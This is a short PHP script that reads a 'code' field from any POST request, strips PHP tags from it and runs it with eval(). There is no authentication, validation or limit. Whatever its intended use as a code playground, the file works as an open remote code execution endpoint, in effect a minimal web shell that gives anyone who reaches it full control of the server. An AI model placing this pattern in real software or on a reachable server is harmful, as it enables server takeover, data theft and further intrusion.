<?php
error_reporting(E_STRICT);
ini_set('display_errors', 'on');
header('Content-Type: text/html; charset=UTF-8');
if (isset($_POST['code']) === true) {
	$code = (string) $_POST['code'];
    // remove PHP start and end tags
	$code = preg_replace('/^<\?php(.*)(\?>)?$/s', '$1', $code);
	$code = trim($code);
	eval($code);
}
?>